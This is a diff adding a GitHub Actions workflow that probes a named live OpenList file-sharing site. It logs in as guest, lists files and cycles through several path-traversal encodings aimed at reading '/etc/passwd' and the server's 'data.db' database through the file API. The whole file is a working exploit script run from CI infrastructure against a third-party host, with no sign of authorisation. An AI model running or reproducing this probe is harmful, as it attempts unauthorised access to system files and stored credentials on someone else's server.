@@ -1,0 +1,45 @@
+name: openlist-pt2
+on:
+  workflow_dispatch:
+jobs:
+  pt2:
+    runs-on: ubuntu-latest
+    steps:
+      - name: isolate whether guest /api/fs/get can return raw_url + test more traversal encodings
+        run: |
+          set +e
+          B="https://pan.yazinb.icu"
+          TOKEN=$(curl -skS -m20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}' | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))")
+          echo "guest_token_len=${#TOKEN}"; export TOKEN
+          get_raw () { curl -skS -m30 -X POST "$B/api/fs/get" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"$1\"}" | python3 -c "import sys,json;d=json.load(sys.stdin);print((d.get('data') or {}).get('raw_url','')) if d else 'NODATA:'+str(d)" 2>/dev/null; }
+
+          # A) list root, grab a real first FILE name to prove /api/fs/get returns raw_url at all for guest
+          echo "--- fs/list / (first entries) ---"
+          curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d '{"path":"/","per_page":5}' \
+            | python3 -c "import sys,json;d=json.load(sys.stdin);[print('  ',c.get('name'),'type=',c.get('type')) for c in d.get('data',{}).get('content',[])[:5]]" 2>/dev/null
+          FIRST=$(curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d '{"path":"/","per_page":50}' \
+            | python3 -c "import sys,json;d=json.load(sys.stdin);c=d.get('data',{}).get('content',[]);f=[x for x in c if x.get('type')==0 or x.get('type')=='file'];print(f[0]['name'] if f else '')" 2>/dev/null)
+          echo "FIRST_FILE=[$FIRST]"
+          if [ -n "$FIRST" ]; then
+            rf=$(get_raw "/$FIRST")
+            echo "REALFILE raw_url=[$rf]  -> guest /api/fs/get mechanism $([ -n "$rf" ] && echo WORKS || echo BROKEN)"
+          fi
+
+          # B) more traversal encodings / variants
+          ENCODED=(
+            "../../../../var/lib/openlist/data.db"
+            "..%2f..%2f..%2f..%2fvar%2flib%2fopenlist%2fdata.db"
+            "....//....//....//....//var/lib/openlist/data.db"
+            "..\\/..\\/..\\/..\\/var/lib/openlist/data.db"
+            "/var/lib/openlist/data.db"
+            "/var/lib/openlist/data/data.db"
+            "/etc/passwd"
+            "var/lib/openlist/data.db"
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2flib%2fopenlist%2fdata.db"
+          )
+          for p in "${ENCODED[@]}"; do
+            echo "=== enc path=[$p] ==="
+            ru=$(get_raw "$p")
+            echo "  raw_url=[$ru]"
+          done
+          echo "=== DONE ==="
